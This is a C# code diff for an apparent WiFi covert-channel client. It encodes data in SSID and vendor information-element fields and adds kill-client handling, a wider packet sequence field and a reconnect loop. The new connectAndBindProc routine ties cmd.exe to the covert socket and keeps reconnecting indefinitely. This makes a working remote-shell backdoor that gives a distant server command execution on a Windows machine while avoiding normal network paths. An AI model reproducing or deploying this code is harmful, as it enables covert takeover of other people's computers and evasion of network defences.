@@ -212,9 +212,10 @@ namespace NWiFi
         public const byte CTLM_TYPE_SET_CLIENT_POLL_INTERVALL = 9; // currently unused
         
 	    public const byte CON_RESET_REASON_UNSPECIFIED = 0;
-        public const byte CON_RESET_REASON_INVALID_CLIENT_ID = 1; 
-    
-        public const byte PAY1_MAX_LEN = 28;
+        public const byte CON_RESET_REASON_INVALID_CLIENT_ID = 1;
+        public const byte CON_RESET_REASON_KILL_CLIENT = 2; //this isn't exactly a reason code for connection reset, but used in case CTLM_TYPE_KILL_CLIENT is received
+
+        public const byte PAY1_MAX_LEN = 27;
         public const byte PAY2_MAX_LEN = 236;
 
         /*
@@ -223,8 +224,9 @@ namespace NWiFi
          * SSID - 32 BYTES (pay1)
          * ----------------------
          * byte 0: pay1[0], if FlagControlMessage is set CTRL_TYPE
-         * byte 1..27: pay1[0..27]
-         * byte 28 ack_seq bits: 0..3 = ack, 4..7 = seq
+         * byte 1..26: pay1[0..26]
+         * byte 27 ack
+         * byte 28 seq
          * byte 29 flag_len bits: 0 = FlagControlMessage, 1 = reserved, 2 = reserved, 3-7 = len_pay1
          * byte 30 clientID_srvID bits: 0..3 = clientID, 4..7 = srvID
          * byte 31 chk_pay1: 8 bit checksum
@@ -258,9 +260,8 @@ namespace NWiFi
                 Array.Copy(raw_ven_ie_data, packet.pay2, pay2_len);
             }
 
-            byte ack_seq = raw_ssid_data[28];
-            packet.ack = (byte)(ack_seq >> 4);
-            packet.seq = (byte)(ack_seq & 0x0F);
+            packet.ack = (byte)(raw_ssid_data[27]);
+            packet.seq = (byte)(raw_ssid_data[28]);
 
             byte flag_len = raw_ssid_data[29];
             packet.FlagControlMessage = ((flag_len & 0x80) != 0);
@@ -297,8 +298,8 @@ namespace NWiFi
             Array.Copy(this.pay1, res, pay1_len); //gets truncated to payload max len, is already padded with zeros
 
             // build ack_seq
-            byte ack_seq = (byte)((this.ack << 4) | (this.seq & 0x0F));
-            res[28] = ack_seq;
+            res[27] = this.ack;
+            res[28] = this.seq;
 
             //build flag_len
             byte flag_len = pay1_len;
@@ -502,6 +503,8 @@ namespace NWiFi
 
         public byte srvID = 0;
 
+        public int socket_close_reason = 0;
+
         public SocketState state = SocketState.CLOSE;
 
         private IntPtr nwifi_client_handle;
@@ -524,7 +527,18 @@ namespace NWiFi
         {
             Console.WriteLine(String.Format("Connection reset from server, reason code: {0}", reason_code));
             this.state = SocketState.CLOSE;
+            this.socket_close_reason = reason_code;
         }
+
+        private void onKillClient(int reason_code=0)
+        {
+            Console.WriteLine(String.Format("Server issued KILL CLIENT: {0}", reason_code));
+            //Throw exception
+
+            this.state = SocketState.CLOSE;
+            this.socket_close_reason = Packet2.CON_RESET_REASON_KILL_CLIENT;
+        }
+
 
         public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte srvID = 8, int maxAttempts = -1)
         {
@@ -669,9 +683,26 @@ namespace NWiFi
                         Packet2 initResp2 = recv[j];
 
                         if (!initResp2.FlagControlMessage) continue; //next packet
-                        if (initResp2.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP2) continue;
                         if (initResp2.srvID != this.srvID) continue; //received from wrong server
+                        
+
+                        //handle reset
+                        if (initResp2.ctlm_type == Packet2.CTLM_TYPE_CON_RESET)
+                        {
+                            int reset_reason = Packet2.CON_RESET_REASON_UNSPECIFIED;
+                            //extract reason if present
+                            if (initResp2.pay1.Length > 1) reset_reason = initResp2.pay1[1];
+
+                            this.onDisconnect(reset_reason);
+                        }
+                        else if (initResp2.ctlm_type == Packet2.CTLM_TYPE_KILL_CLIENT)
+                        {
+                            this.onKillClient();
+                        }
+
                         if (initResp2.ack != 2) continue; //next packet
+                        if (initResp2.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP2) continue;
+
                         bool rnd_valid = true;
                         for (int i = 0; i < this.clientIV.Length; i++)
                         {
@@ -796,7 +827,7 @@ namespace NWiFi
                     }
 
                     
-                    byte next_resp_seq = (byte)((req.ack + 1) & 0xF);
+                    byte next_resp_seq = (byte)((req.ack + 1) & 0xFF);
                     if (resp.seq == next_resp_seq)
                     {
                         Console.WriteLine("*****New INDATA*****");
@@ -840,6 +871,10 @@ namespace NWiFi
                                 if (resp.pay1.Length > 1) reset_reason = resp.pay1[1];
 
                                 this.onDisconnect(reset_reason);
+                            }
+                            else if(resp.ctlm_type == Packet2.CTLM_TYPE_KILL_CLIENT)
+                            {
+                                this.onKillClient();
                             }
                             //don't advance ack for next request
                         }
@@ -890,7 +925,7 @@ namespace NWiFi
                         if (new_out)
                         {
                             req.seq += 1;
-                            req.seq &= 0xF;
+                            req.seq &= 0xFF;
                             tx_packet_dirty = true;
 
                             //If outbound data is present in the queue, we send it
@@ -1374,8 +1409,7 @@ namespace NWiFi
             IntPtr scan_res = new IntPtr();
             WlanGetNetworkBssList(clientHandle, ref interface_guid, IntPtr.Zero, Dot11BssType.Any, false, IntPtr.Zero, out scan_res);
 
-            //if (scan_res.ToInt64() == 0) return new Packet2[0];
-
+            
             //Convert result to WlanBSSListHeader struct + multiple WlanBSSEntry structs
             WlanBssListHeader bssListHeader = (WlanBssListHeader)Marshal.PtrToStructure(scan_res, typeof(WlanBssListHeader));
             long bssListPtr = scan_res.ToInt64() + Marshal.SizeOf(typeof(WlanBssListHeader));
@@ -1390,8 +1424,6 @@ namespace NWiFi
                 byte[] in_sa = null;
                 byte[] in_ie_vendor = null;
                 uint in_ssid_len = 0;
-                
-
 
                 bssEntries[i] = (WlanBssEntry)Marshal.PtrToStructure(new IntPtr(bssListPtr), typeof(WlanBssEntry)); //Convert data at current bssListPtr to WlanBssEntry struct
                 //calculate pointer to IeData for current BSS_ENTRY
@@ -1546,8 +1578,10 @@ namespace NWiFi
                 csock.Send(outbytes, outbytes.Length, true);
             }
 
-            public bool attachSubProcToSocket()
+            public int attachSubProcToSocket()
             {
+                int socket_disconnect_reason = 0;
+
                 this.psi = new ProcessStartInfo(command)
                 {
                     RedirectStandardOutput = true,
@@ -1582,13 +1616,98 @@ namespace NWiFi
                         this.proc.StandardInput.Flush();
                     }
                 }
+                
+                if (csock.state == SocketState.CLOSE)
+                {
+                    //socket disconnected, extract reason
+                    socket_disconnect_reason = csock.socket_close_reason;
+                    Console.WriteLine(String.Format("Socket backing the process disconnected with reason: {0}", socket_disconnect_reason));
+                }
                 Console.WriteLine(String.Format("Socket closed ... ending listening process '{0}'", this.command));
                 this.proc.Close();
                 this.proc.Dispose();
 
-                return true;
+                return socket_disconnect_reason;
             }
             
+        }
+
+        public static int connectAndBindProc(int connection_attempts=3, byte server_id=9)
+        {
+            /*
+             * Return codes
+             * -1: no WiFi API handle
+             * -2: Couldn't register for "scan completed" notification
+             * -3: None of the interface allowed a connection to the server (after 3 attempts)
+             * -4: Connection reset for unknown reason (happens when the server kills the socket --> retry connect)
+             * -5: Server requested kill client
+             */
+
+            IntPtr handle = openNativeWifiHandle();
+            if (handle == IntPtr.Zero)
+            {
+                Console.WriteLine("No valid handle for native WiFi API received");
+                return -1;
+            }
+
+            try
+            {
+                WlanNotificationSource prevSrc;
+                WlanRegisterNotification(handle, WlanNotificationSource.ACM, false, OnACMNotification, IntPtr.Zero, IntPtr.Zero, out prevSrc);
+            }
+            catch
+            {
+                Console.WriteLine("Error registering for Notifications");
+                closeNativeWifiHandle(handle);
+                return -2;
+            }
+
+
+            //Enumerate interfaces
+            WlanInterfaceInfo[] ifis = enumInterfaces(handle);
+
+            int connection_exit_code = -3;
+
+            //Try every available interface
+            foreach (WlanInterfaceInfo ifi in ifis)
+            //WlanInterfaceInfo ifi = ifis[1];
+            {
+                //ToDo: Ignore stale interfaces
+
+                //use first available interface
+                Guid g_if = ifi.interfaceGuid;
+                Console.WriteLine(String.Format("Trying to connect covert channel via '{0}'", ifi.interfaceDescription));
+
+                ClientSocket wsock = new ClientSocket();
+                
+                bool conres = wsock.Connect(handle, g_if, server_id, connection_attempts);
+
+                if (conres)
+                {
+                    Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));
+                    ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
+                    int result = cp.attachSubProcToSocket();
+                    if (result == 1) connection_exit_code = -4;
+                    else if (result == 2)
+                    {
+                        connection_exit_code = -5; //kill client
+                        break;
+                    }
+                    Console.WriteLine(String.Format("Subprocess died with reason code: {0}", result));
+                }
+                else
+                {
+                    Console.WriteLine(String.Format("No success after {0} connection attempts", connection_attempts));
+                }
+
+
+
+            }
+
+            Console.WriteLine("Closing handle to native WiFi API");
+            closeNativeWifiHandle(handle);
+
+            return connection_exit_code;
         }
 
         
@@ -1605,63 +1724,18 @@ namespace NWiFi
 
             Console.WriteLine("Starting test");
 #endif
-            IntPtr handle = openNativeWifiHandle();
-            if (handle == IntPtr.Zero)
+            bool retry = true;
+            while (retry)
             {
-                Console.WriteLine("No valid handle for native WiFi API received");
-                return;
-            }
-
-            try
-            {
-                WlanNotificationSource prevSrc;
-                WlanRegisterNotification(handle, WlanNotificationSource.ACM, false, OnACMNotification, IntPtr.Zero, IntPtr.Zero, out prevSrc);
-            }
-            catch
-            {
-                Console.WriteLine("Error registering for Notifications");
-                closeNativeWifiHandle(handle);
-                return;
+                int ex_code = connectAndBindProc(-1, 9); //listen on server ID 9, endless connection attempts
+                Console.WriteLine(String.Format("Process died with exit code: {0}", ex_code));
+                if (ex_code == -5) break;
             }
 
 
-            //Enumerate interfaces
-            WlanInterfaceInfo[] ifis = enumInterfaces(handle);
-
-            //Try every available interface
-            foreach (WlanInterfaceInfo ifi in ifis)
-            //WlanInterfaceInfo ifi = ifis[1];
-            {
-                //ToDo: Ignore stale interfaces
-
-                //use first available interface
-                Guid g_if = ifi.interfaceGuid;
-                Console.WriteLine(String.Format("Trying to connect covert channel via '{0}'", ifi.interfaceDescription));
-
-                ClientSocket wsock = new ClientSocket();
-                int max_connection_attempts = -1;
-                bool conres = wsock.Connect(handle, g_if, 9, max_connection_attempts);
-
-                if (conres)
-                {
-                    Console.WriteLine(String.Format("Connection established\nMTU: {0}\nClientID: {1}", wsock.MTU, wsock.clientID));
-                    ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
-                    cp.attachSubProcToSocket();
-                }
-                else
-                {
-                    Console.WriteLine(String.Format("No success after {0} connection attempts", max_connection_attempts));
-                }
-
-               
-                //Avoid exitting lib
-                //Console.Read();
-                
-            }
-
-            Console.WriteLine("Closing handle to native WiFi API");
-            closeNativeWifiHandle(handle);
+            //Avoid exitting lib
+            //Console.Read();
         }
-        
+
     }
 }
